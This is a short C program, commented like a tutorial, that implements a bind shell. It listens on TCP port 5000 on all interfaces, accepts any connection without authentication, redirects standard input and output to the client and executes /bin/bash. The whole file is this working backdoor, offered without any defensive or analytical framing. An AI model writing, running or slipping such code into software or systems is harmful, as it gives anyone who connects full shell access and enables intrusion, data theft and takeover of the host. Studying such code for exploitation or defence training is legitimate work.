#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
	printf("Starting...");
	/* Initialize some variables */
	int sockfd = 0, clientfd = 0; 

	/* Initialize the socket */
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

	/* Set up the params for the server socket */
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(5000); /* htons to convert to network byte order */
	printf("Struct size: %d", sizeof(server_addr));

	/* Bind to the address we gave it */
	bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));

	/* tell the server to listen */
	listen(sockfd, 10);
	
	/* 
	 * We should now start accepting client connections 
	 * the NULLS are because we dont care who is connecting
	 * if we did we would need a pointer to a fresh sockaddr_in
	 * struct for the accept call to fill in
	 */

	clientfd = accept(sockfd, (struct sockaddr*)NULL, NULL);

	/* Redirect STDIN(0), STDOUT(1) and STDERR(2) to the client socket */
	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);
	
	/* execute the shell */
	char* args[] = {"/bin/bash", NULL};
	execve(args[0], args, NULL);

}


